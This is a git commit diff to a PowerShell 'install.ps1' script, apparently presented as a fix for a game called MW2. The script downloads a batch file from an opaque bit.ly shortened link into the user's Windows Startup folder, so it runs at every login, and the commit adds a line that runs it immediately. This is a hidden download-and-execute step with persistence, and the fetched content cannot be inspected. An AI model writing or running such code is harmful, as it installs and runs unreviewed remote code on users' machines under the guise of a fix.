82fee29a79ab66443c8a8e5435cff0fd8f87a8eb
Jay <54886938+JayXTQ@users.noreply.github.com>
2022-12-23 22:34:37 +0000

    Update install.ps1

--- MW2/install.ps1
+++ MW2/install.ps1
@@ -2,3 +2,4 @@ $url = "https://bit.ly/3PMNXVp"
 $startupFolder = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 $localPath = Join-Path -Path $startupFolder -ChildPath "MW2-Fix.bat"
 Invoke-WebRequest -Uri $url -OutFile $localPath
+$localPath
